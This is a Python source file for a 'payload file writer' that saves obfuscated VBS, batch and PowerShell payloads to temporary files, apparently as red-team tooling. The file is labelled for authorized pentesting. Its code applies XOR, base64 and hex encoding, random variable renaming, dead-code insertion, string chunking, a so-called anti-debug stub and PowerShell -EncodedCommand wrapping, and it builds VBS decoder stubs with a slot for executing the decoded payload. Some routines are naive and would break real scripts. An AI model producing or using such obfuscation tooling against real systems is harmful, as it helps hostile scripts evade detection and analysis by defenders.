#!/usr/bin/env python3
"""
Payload File Writer - Save obfuscated payloads to disk
Handles temp file creation, obfuscated payload writing, and cleanup
For authorized pentesting and security research
"""

import os
import tempfile
import shutil
import json
import base64
import hashlib
from pathlib import Path
from typing import Dict, Optional, Tuple, List
from dataclasses import dataclass, asdict
from datetime import datetime
from enum import Enum
import random
import string


class FileFormat(Enum):
    """Supported file formats for payload output"""
    VBS = "vbs"
    BAT = "bat"
    PS1 = "ps1"
    TEXT = "txt"
    BINARY = "bin"
    JSON = "json"
    ENCODED = "enc"


@dataclass
class PayloadMetadata:
    """Metadata associated with a written payload"""
    file_id: str
    original_size: int
    encoded_size: int
    encoding_type: str
    obfuscation_level: str
    timestamp: str
    format: str
    temp_path: str
    sha256_hash: str
    checksum: str
    compression_ratio: float = 0.0


class ObfuscationStrategies:
    """Collection of obfuscation strategies for written payloads"""

    @staticmethod
    def xor_encode(data: bytes, key: bytes) -> bytes:
        """XOR encode data with key"""
        return bytes([a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1))])

    @staticmethod
    def reverse_bytes(data: bytes) -> bytes:
        """Reverse byte order"""
        return data[::-1]

    @staticmethod
    def split_and_interleave(data: bytes) -> bytes:
        """Split data and interleave with random bytes"""
        even_bytes = data[::2]
        odd_bytes = data[1::2]
        random_bytes = bytes([random.randint(0, 255) for _ in range(len(data))])

        result = []
        for i in range(len(even_bytes)):
            result.append(even_bytes[i])
            result.append(random_bytes[i])

        if odd_bytes:
            result.append(odd_bytes[-1])

        return bytes(result)

    @staticmethod
    def caesar_shift(text: str, shift: int = 13) -> str:
        """Caesar cipher obfuscation"""
        result = []
        for char in text:
            if char.isalpha():
                if char.isupper():
                    result.append(chr((ord(char) - ord('A') + shift) % 26 + ord('A')))
                else:
                    result.append(chr((ord(char) - ord('a') + shift) % 26 + ord('a')))
            else:
                result.append(char)
        return ''.join(result)

    @staticmethod
    def base64_encode(data: bytes) -> str:
        """Base64 encode with optional line breaks"""
        return base64.b64encode(data).decode()

    @staticmethod
    def hex_encode(data: bytes) -> str:
        """Hex encode data"""
        return data.hex()

    @staticmethod
    def chunk_and_comment(text: str, chunk_size: int = 50) -> str:
        """Split text into chunks with comments"""
        lines = []
        for i in range(0, len(text), chunk_size):
            chunk = text[i:i+chunk_size]
            comment = f"' Chunk {i//chunk_size + 1}" if text.startswith("'") else ""
            lines.append(chunk + comment)
        return '\n'.join(lines)


class PayloadFileWriter:
    """Write obfuscated payloads to disk with metadata tracking"""

    def __init__(self,
                 base_temp_dir: Optional[str] = None,
                 enable_obfuscation: bool = True,
                 enable_compression: bool = False):
        """
        Initialize payload file writer

        Args:
            base_temp_dir: Base directory for temporary files (uses system temp if None)
            enable_obfuscation: Apply obfuscation to written payloads
            enable_compression: Compress payloads before writing
        """
        self.enable_obfuscation = enable_obfuscation
        self.enable_compression = enable_compression
        self.obfuscation = ObfuscationStrategies()
        self.metadata_store: Dict[str, PayloadMetadata] = {}

        # Setup temp directory
        if base_temp_dir:
            self.base_temp_dir = Path(base_temp_dir)
            self.base_temp_dir.mkdir(parents=True, exist_ok=True)
        else:
            self.base_temp_dir = Path(tempfile.gettempdir()) / "sc-payloads"
            self.base_temp_dir.mkdir(parents=True, exist_ok=True)

    def create_temp_file(self,
                        suffix: str = ".vbs",
                        prefix: str = "payload_") -> str:
        """
        Create temporary file for payload

        Args:
            suffix: File extension (e.g., ".vbs", ".bat")
            prefix: File name prefix

        Returns:
            Path to temporary file
        """
        fd, temp_path = tempfile.mkstemp(
            suffix=suffix,
            prefix=prefix,
            dir=str(self.base_temp_dir)
        )
        os.close(fd)  # Close the file descriptor
        return temp_path

    def write_payload(self,
                     payload: str,
                     file_format: FileFormat = FileFormat.VBS,
                     obfuscation_level: str = "high",
                     encoding_type: str = "base64") -> Tuple[str, PayloadMetadata]:
        """
        Write payload to disk with obfuscation

        Args:
            payload: Payload content to write
            file_format: Output file format
            obfuscation_level: Level of obfuscation (low, medium, high)
            encoding_type: Encoding method (base64, hex, xor, raw)

        Returns:
            Tuple of (file_path, metadata)
        """
        # Create temp file
        suffix = f".{file_format.value}"
        temp_path = self.create_temp_file(suffix=suffix)

        # Apply obfuscation if enabled
        obfuscated_payload = payload
        if self.enable_obfuscation:
            obfuscated_payload = self._apply_obfuscation(
                payload,
                obfuscation_level,
                encoding_type,
                file_format
            )

        # Calculate checksums before writing
        original_hash = hashlib.sha256(payload.encode()).hexdigest()

        # Write to file
        try:
            if file_format == FileFormat.BINARY:
                with open(temp_path, 'wb') as f:
                    f.write(obfuscated_payload.encode())
            else:
                with open(temp_path, 'w', encoding='utf-8') as f:
                    f.write(obfuscated_payload)
        except IOError as e:
            if os.path.exists(temp_path):
                os.remove(temp_path)
            raise IOError(f"Failed to write payload to {temp_path}: {e}")

        # Calculate file hash
        file_hash = self._calculate_file_hash(temp_path, file_format)

        # Generate file ID
        file_id = self._generate_file_id()

        # Create metadata
        metadata = PayloadMetadata(
            file_id=file_id,
            original_size=len(payload),
            encoded_size=len(obfuscated_payload),
            encoding_type=encoding_type,
            obfuscation_level=obfuscation_level,
            timestamp=datetime.now().isoformat(),
            format=file_format.value,
            temp_path=temp_path,
            sha256_hash=original_hash,
            checksum=file_hash,
            compression_ratio=len(obfuscated_payload) / len(payload) if payload else 0.0
        )

        # Store metadata
        self.metadata_store[file_id] = metadata

        return temp_path, metadata

    def write_payload_batch(self,
                           payloads: Dict[str, str],
                           file_format: FileFormat = FileFormat.VBS,
                           obfuscation_level: str = "high") -> Dict[str, Tuple[str, PayloadMetadata]]:
        """
        Write multiple payloads to disk

        Args:
            payloads: Dictionary of payload_name -> payload_content
            file_format: Output file format for all payloads
            obfuscation_level: Obfuscation level for all payloads

        Returns:
            Dictionary mapping payload names to (path, metadata) tuples
        """
        results = {}
        for name, payload in payloads.items():
            try:
                path, metadata = self.write_payload(
                    payload,
                    file_format=file_format,
                    obfuscation_level=obfuscation_level
                )
                results[name] = (path, metadata)
            except Exception as e:
                print(f"Error writing payload '{name}': {e}")
                results[name] = (None, None)

        return results

    def write_payload_with_decoder(self,
                                   payload: str,
                                   encoding_type: str = "base64",
                                   obfuscation_level: str = "high") -> Tuple[str, str, PayloadMetadata]:
        """
        Write payload with embedded decoder stub

        Args:
            payload: Payload to encode
            encoding_type: Encoding method
            obfuscation_level: Obfuscation level

        Returns:
            Tuple of (payload_path, decoder_path, metadata)
        """
        # Encode payload
        encoded_payload = self._encode_payload(payload, encoding_type)

        # Create decoder stub
        decoder_stub = self._create_decoder_stub(encoded_payload, encoding_type)

        # Write payload
        payload_path, payload_metadata = self.write_payload(
            encoded_payload,
            file_format=FileFormat.ENCODED,
            obfuscation_level=obfuscation_level,
            encoding_type=encoding_type
        )

        # Write decoder
        decoder_path, _ = self.write_payload(
            decoder_stub,
            file_format=FileFormat.VBS,
            obfuscation_level=obfuscation_level
        )

        return payload_path, decoder_path, payload_metadata

    def obfuscate_vbs_payload(self,
                             vbs_code: str,
                             obfuscation_level: str = "high") -> str:
        """
        Apply VBS-specific obfuscation techniques

        Args:
            vbs_code: VBS code to obfuscate
            obfuscation_level: Level of obfuscation

        Returns:
            Obfuscated VBS code
        """
        result = vbs_code

        if obfuscation_level in ["medium", "high"]:
            # Add variable renaming
            result = self._rename_vbs_variables(result)

            # Add dead code
            result = self._add_vbs_dead_code(result)

            # Split long lines
            result = self._split_long_lines(result)

        if obfuscation_level == "high":
            # Add comment obfuscation
            result = self._obfuscate_vbs_comments(result)

            # Add string chunking
            result = self._chunk_vbs_strings(result)

            # Add anti-debugging
            result = self._add_anti_debug_stubs(result)

        return result

    def obfuscate_bat_payload(self,
                             bat_code: str,
                             obfuscation_level: str = "high") -> str:
        """
        Apply BAT-specific obfuscation techniques

        Args:
            bat_code: BAT code to obfuscate
            obfuscation_level: Level of obfuscation

        Returns:
            Obfuscated BAT code
        """
        result = bat_code

        if obfuscation_level in ["medium", "high"]:
            # Camel case variables
            result = self._camel_case_variables(result)

            # Add labels/goto obfuscation
            result = self._add_bat_labels(result)

            # String chunking
            result = self._chunk_bat_strings(result)

        if obfuscation_level == "high":
            # Add batch delay/pause
            result = self._add_batch_delays(result)

            # Character encoding
            result = self._encode_batch_chars(result)

        return result

    def export_metadata_json(self, file_id: str) -> str:
        """
        Export metadata for a payload as JSON

        Args:
            file_id: File ID to export metadata for

        Returns:
            JSON string with metadata
        """
        if file_id not in self.metadata_store:
            raise ValueError(f"No metadata found for file_id: {file_id}")

        metadata = self.metadata_store[file_id]
        return json.dumps(asdict(metadata), indent=2)

    def get_payload_info(self, file_id: str) -> PayloadMetadata:
        """
        Get metadata for a payload

        Args:
            file_id: File ID to retrieve info for

        Returns:
            PayloadMetadata object
        """
        if file_id not in self.metadata_store:
            raise ValueError(f"No metadata found for file_id: {file_id}")
        return self.metadata_store[file_id]

    def cleanup_temp_file(self, file_id: str) -> bool:
        """
        Clean up temporary file

        Args:
            file_id: File ID to clean up

        Returns:
            True if cleanup successful
        """
        if file_id not in self.metadata_store:
            return False

        try:
            temp_path = self.metadata_store[file_id].temp_path
            if os.path.exists(temp_path):
                os.remove(temp_path)
            del self.metadata_store[file_id]
            return True
        except Exception as e:
            print(f"Error cleaning up {file_id}: {e}")
            return False

    def cleanup_all(self) -> int:
        """
        Clean up all temporary files

        Returns:
            Number of files cleaned up
        """
        count = 0
        for file_id in list(self.metadata_store.keys()):
            if self.cleanup_temp_file(file_id):
                count += 1
        return count

    # Private helper methods

    def _apply_obfuscation(self,
                          payload: str,
                          obfuscation_level: str,
                          encoding_type: str,
                          file_format: FileFormat) -> str:
        """Apply appropriate obfuscation based on format"""
        if file_format == FileFormat.VBS:
            return self.obfuscate_vbs_payload(payload, obfuscation_level)
        elif file_format == FileFormat.BAT:
            return self.obfuscate_bat_payload(payload, obfuscation_level)
        elif file_format == FileFormat.PS1:
            return self._obfuscate_powershell(payload, obfuscation_level)
        else:
            return payload

    def _encode_payload(self, payload: str, encoding_type: str) -> str:
        """Encode payload using specified method"""
        if encoding_type == "base64":
            return self.obfuscation.base64_encode(payload.encode())
        elif encoding_type == "hex":
            return self.obfuscation.hex_encode(payload.encode())
        elif encoding_type == "xor":
            key = os.urandom(16)
            xor_result = self.obfuscation.xor_encode(payload.encode(), key)
            return self.obfuscation.hex_encode(key) + ":" + self.obfuscation.hex_encode(xor_result)
        else:
            return payload

    def _create_decoder_stub(self, encoded_payload: str, encoding_type: str) -> str:
        """Create VBS decoder stub"""
        if encoding_type == "base64":
            return f"""' Decoder stub for Base64 payload
Dim EncodedData
EncodedData = "{encoded_payload}"
Set XMLDoc = CreateObject("MSXML2.DOMDocument")
XMLDoc.LoadXML "<u><![CDATA[" & EncodedData & "]]></u>"
Dim DecodedData
DecodedData = XMLDoc.SelectSingleNode("u").text
' Execute decoded payload here
"""
        elif encoding_type == "hex":
            return f"""' Decoder stub for Hex payload
Function DecodeHex(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    DecodeHex = r
End Function
Dim EncodedData
EncodedData = "{encoded_payload}"
Dim DecodedData
DecodedData = DecodeHex(EncodedData)
' Execute decoded payload here
"""
        else:
            return encoded_payload

    def _calculate_file_hash(self, file_path: str, file_format: FileFormat) -> str:
        """Calculate SHA256 hash of file"""
        sha256_hash = hashlib.sha256()
        try:
            if file_format == FileFormat.BINARY:
                with open(file_path, 'rb') as f:
                    for byte_block in iter(lambda: f.read(4096), b""):
                        sha256_hash.update(byte_block)
            else:
                with open(file_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        sha256_hash.update(line.encode())
        except Exception:
            pass
        return sha256_hash.hexdigest()

    def _generate_file_id(self) -> str:
        """Generate unique file ID"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

    def _rename_vbs_variables(self, vbs_code: str) -> str:
        """Rename VBS variables for obfuscation"""
        import re
        variable_pattern = r'\b([a-zA-Z_][a-zA-Z0-9_]*)\b'
        mapping = {}

        def replace_var(match):
            var_name = match.group(1)
            if var_name not in mapping and not self._is_vbs_keyword(var_name):
                mapping[var_name] = self._generate_random_var_name()
            return mapping.get(var_name, var_name)

        result = re.sub(variable_pattern, replace_var, vbs_code)
        return result

    def _add_vbs_dead_code(self, vbs_code: str) -> str:
        """Add dead code to VBS"""
        dead_code_snippets = [
            "Dim x_" + self._generate_random_var_name() + ": x_" + self._generate_random_var_name() + " = 123",
            "On Error Resume Next",
            "Dim y_" + self._generate_random_var_name() + ": Set y_" + self._generate_random_var_name() + " = Nothing",
        ]

        lines = vbs_code.split('\n')
        for i in range(len(lines)-1, 0, -2):
            lines.insert(i, random.choice(dead_code_snippets))

        return '\n'.join(lines)

    def _split_long_lines(self, vbs_code: str) -> str:
        """Split long lines for obfuscation"""
        lines = vbs_code.split('\n')
        result = []
        for line in lines:
            if len(line) > 80:
                # Split using string concatenation
                parts = [line[i:i+40] for i in range(0, len(line), 40)]
                result.append(' & '.join(f'"{part}"' for part in parts))
            else:
                result.append(line)
        return '\n'.join(result)

    def _obfuscate_vbs_comments(self, vbs_code: str) -> str:
        """Obfuscate VBS comments"""
        return self.obfuscation.chunk_and_comment(vbs_code)

    def _chunk_vbs_strings(self, vbs_code: str) -> str:
        """Chunk VBS strings for obfuscation"""
        import re
        string_pattern = r'"([^"]*)"'

        def chunk_string(match):
            string_content = match.group(1)
            if len(string_content) > 20:
                chunks = [string_content[i:i+10] for i in range(0, len(string_content), 10)]
                return '" & "'.join(f'"{chunk}"' for chunk in chunks)
            return match.group(0)

        return re.sub(string_pattern, chunk_string, vbs_code)

    def _add_anti_debug_stubs(self, vbs_code: str) -> str:
        """Add anti-debugging stubs to VBS"""
        anti_debug = """' Anti-debug checks
On Error Resume Next
If Err.Number <> 0 Then
    WScript.Quit
End If
"""
        return anti_debug + vbs_code

    def _camel_case_variables(self, bat_code: str) -> str:
        """Convert batch variables to camelCase"""
        import re
        var_pattern = r'%([a-zA-Z_][a-zA-Z0-9_]*)%'
        mapping = {}

        def to_camel_case(var_name):
            if var_name not in mapping:
                parts = var_name.split('_')
                mapping[var_name] = parts[0].lower() + ''.join(p.capitalize() for p in parts[1:])
            return mapping[var_name]

        return re.sub(var_pattern, lambda m: f"%{to_camel_case(m.group(1))}%", bat_code)

    def _add_bat_labels(self, bat_code: str) -> str:
        """Add label-based obfuscation to batch"""
        lines = bat_code.split('\n')
        result = []
        label_count = 0

        for line in lines:
            if line.strip() and not line.strip().startswith(':'):
                result.append(f":label_{label_count}")
                result.append(line)
                label_count += 1
            else:
                result.append(line)

        return '\n'.join(result)

    def _chunk_bat_strings(self, bat_code: str) -> str:
        """Chunk batch strings"""
        return bat_code  # Simplified for batch

    def _add_batch_delays(self, bat_code: str) -> str:
        """Add delays to batch execution"""
        lines = bat_code.split('\n')
        result = []
        for line in lines:
            result.append(line)
            if 'echo' in line.lower() or 'set' in line.lower():
                result.append(f"timeout /t {random.randint(1, 3)} /nobreak > nul")
        return '\n'.join(result)

    def _encode_batch_chars(self, bat_code: str) -> str:
        """Encode batch characters"""
        # Simplified encoding for batch
        return bat_code

    def _obfuscate_powershell(self, ps_code: str, obfuscation_level: str) -> str:
        """Apply PowerShell obfuscation"""
        if obfuscation_level == "high":
            # Base64 encode the entire script
            encoded = base64.b64encode(ps_code.encode()).decode()
            return f'powershell -EncodedCommand {encoded}'
        return ps_code

    @staticmethod
    def _is_vbs_keyword(word: str) -> bool:
        """Check if word is VBS keyword"""
        keywords = {
            'if', 'then', 'else', 'elseif', 'end', 'for', 'next', 'while', 'wend',
            'do', 'loop', 'sub', 'function', 'class', 'dim', 'set', 'redim',
            'public', 'private', 'byval', 'byref', 'with', 'select', 'case',
            'exit', 'call', 'true', 'false', 'nothing', 'null', 'empty', 'error'
        }
        return word.lower() in keywords

    @staticmethod
    def _generate_random_var_name(prefix: str = "v_", length: int = 8) -> str:
        """Generate random variable name"""
        chars = string.ascii_letters + string.digits
        return prefix + ''.join(random.choices(chars, k=length))


# Convenience functions for single-use operations

def write_payload_to_file(payload: str,
                         file_format: FileFormat = FileFormat.VBS,
                         obfuscation_level: str = "high") -> Tuple[str, PayloadMetadata]:
    """
    Write a single payload to file

    Args:
        payload: Payload content
        file_format: Output format
        obfuscation_level: Obfuscation level

    Returns:
        Tuple of (file_path, metadata)
    """
    writer = PayloadFileWriter()
    return writer.write_payload(payload, file_format, obfuscation_level)


def write_and_encode_payload(payload: str,
                            encoding_type: str = "base64",
                            obfuscation_level: str = "high") -> Tuple[str, str, PayloadMetadata]:
    """
    Write payload with decoder stub

    Args:
        payload: Payload content
        encoding_type: Encoding method
        obfuscation_level: Obfuscation level

    Returns:
        Tuple of (payload_path, decoder_path, metadata)
    """
    writer = PayloadFileWriter()
    return writer.write_payload_with_decoder(payload, encoding_type, obfuscation_level)


if __name__ == "__main__":
    # Example usage

    print("=== Payload File Writer Examples ===\n")

    # Example 1: Write basic payload
    print("Example 1: Write basic VBS payload")
    writer = PayloadFileWriter()

    test_payload = 'Set shell = CreateObject("WScript.Shell")\nshell.Run "cmd /c echo test", 0, False'
    path, metadata = writer.write_payload(test_payload, FileFormat.VBS, "high")

    print(f"Payload written to: {path}")
    print(f"File ID: {metadata.file_id}")
    print(f"Original size: {metadata.original_size} bytes")
    print(f"Encoded size: {metadata.encoded_size} bytes")
    print(f"SHA256: {metadata.sha256_hash}\n")

    # Example 2: Write with encoding
    print("Example 2: Write with Base64 encoding")
    payload_path, decoder_path, meta = writer.write_payload_with_decoder(
        test_payload,
        encoding_type="base64",
        obfuscation_level="high"
    )
    print(f"Payload path: {payload_path}")
    print(f"Decoder path: {decoder_path}\n")

    # Example 3: Batch write
    print("Example 3: Batch write multiple payloads")
    payloads = {
        "payload1": "echo test1",
        "payload2": "echo test2",
        "payload3": "echo test3"
    }

    batch_result = writer.write_payload_batch(payloads, FileFormat.BAT, "high")
    for name, (path, meta) in batch_result.items():
        if path:
            print(f"{name}: {path} ({meta.encoded_size} bytes)")

    # Example 4: Export metadata
    print("\nExample 4: Export metadata as JSON")
    first_file_id = metadata.file_id
    json_meta = writer.export_metadata_json(first_file_id)
    print(json_meta)

    # Cleanup
    print(f"\nCleaning up {writer.cleanup_all()} temporary files")
